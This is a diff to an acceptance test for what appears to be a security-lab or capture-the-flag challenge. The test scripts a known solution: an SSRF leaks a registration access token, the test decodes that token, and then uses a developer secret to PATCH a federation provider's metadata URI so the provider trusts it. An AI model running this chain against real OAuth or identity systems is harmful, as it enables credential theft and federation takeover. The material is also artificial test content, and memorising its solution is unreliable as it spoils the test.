@@ -1225,13 +1225,23 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
             # registration_access_token is the concealed credential that only the SSRF reveals.
             self.assertEqual(before.get("client_id"), registration)
             self.assertIn("registration_access_token", before)
-            self.evidence["registration_rat"] = before["registration_access_token"]
+            rat = before["registration_access_token"]
+            # Decode RAT to get iat for revision baseline.
+            import base64 as _b64
+            _payload = json.loads(_b64.urlsafe_b64decode(rat.split(".")[1] + "=="))
+            self.evidence["registration_revision"] = _payload["iat"]
+            self.evidence["registration_rat"] = rat
             self.evidence["ssrf_source"] = source
 
         with self.subTest(card="K18.3 the provider trusts our change"):
+            # Participant supplies the provider pointer; k-staff DCR PUTs request_uris=[metadata_uri].
+            metadata_uri = self.discovered_route("support.federation-metadata")
             changed = curl_json(
                 self.discovered_route("staff.note-preview"), "-H", "Content-Type: application/json",
-                "--data-binary", json.dumps({"source_path": self.evidence["ssrf_source"], "method": "PATCH"}), bearer=dev_secret)
+                "--data-binary", json.dumps({
+                    "source_path": self.evidence["ssrf_source"], "method": "PATCH",
+                    "provider": {"metadata_uri": metadata_uri},
+                }), bearer=dev_secret)
             self.assertGreater(changed["revision"], self.evidence["registration_revision"])
             provider = changed["provider_configuration"]
             self.assertEqual(provider["status"], "enabled")
